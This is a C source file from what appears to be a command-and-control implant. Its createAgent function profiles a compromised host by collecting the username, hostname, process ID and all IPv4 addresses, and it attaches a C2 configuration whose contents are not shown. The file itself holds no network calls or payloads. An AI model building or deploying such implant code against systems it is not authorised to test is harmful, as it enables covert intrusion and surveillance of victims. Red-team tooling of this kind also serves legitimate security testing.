#include "agent.h"
#include "c2.h"
#include "config.h"
#include "utils.h"
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

Agent *createAgent(char *name) {
    Agent *agent = calloc(1, sizeof(Agent));
    if (!agent)
        return NULL;

    agent->c2config = createC2Config();
    if (!agent->c2config) {
        free(agent);
        return NULL;
    }

    memcpy(agent->uuid, INIT_UUID, sizeof(INIT_UUID));
    memcpy(agent->payload_uuid, INIT_UUID, UUIDSIZE);
    agent->payload_uuid[UUIDSIZE] = '\0';
    strncpy(agent->procname, name, sizeof(agent->procname) - 1);
    strncpy(agent->os, OS, sizeof(agent->os) - 1);
    agent->sleeptime = SLEEP_TIME;
    agent->pid = getpid();

    // get user — fall back to "unknown" if $USER is unset
    const char *username = getenv("USER");
    if (!username)
        username = "unknown";
    strncpy(agent->user, username, sizeof(agent->user) - 1);

    // get host
    gethostname(agent->host, sizeof(agent->host) - 1);
    agent->host[sizeof(agent->host) - 1] = '\0';

    // get all IPv4 addresses (up to the ips[] array capacity)
    struct ifaddrs *ifaddr;
    int ipcount = 0;
    if (getifaddrs(&ifaddr) == 0) {
        for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if (ipcount >= (int)(sizeof(agent->ips) / sizeof(agent->ips[0])))
                break;
            if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET)
                continue;
            agent->ips[ipcount] = malloc(INET_ADDRSTRLEN);
            if (!agent->ips[ipcount])
                continue;
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)ifa->ifa_addr;
            if (inet_ntop(AF_INET, &ipv4->sin_addr,
                          agent->ips[ipcount], INET_ADDRSTRLEN)) {
                ipcount++;
            } else {
                free(agent->ips[ipcount]);
            }
        }
        freeifaddrs(ifaddr);
    }
    agent->ipcount = ipcount;

    return agent;
}

#ifdef DEBUG
void printAgent(Agent *agent) {
    char ip_list[BUFSIZE] = "[";
    for (int i = 0; i < agent->ipcount; i++) {
        strcat(ip_list, agent->ips[i]);
        if (i != agent->ipcount - 1)
            strcat(ip_list, ", ");
    }
    strcat(ip_list, "]");
    DBGPRINT("{\nUUID: %s\nSLEEPTIME: %d\nPID: %d\nPROCNAME: %s\nUSER: %s\nOS: %s\nHOST: %s\nIP: %s\n}\n",
             agent->uuid, agent->sleeptime, agent->pid, agent->procname, agent->user, agent->os, agent->host,
             ip_list);
    printC2Config(agent->c2config);
}
#endif

void destroyAgent(Agent *agent) {
    if (!agent)
        return;
    for (int i = 0; i < agent->ipcount; i++)
        free(agent->ips[i]);
    destroyC2Config(agent->c2config);
    free(agent);
}
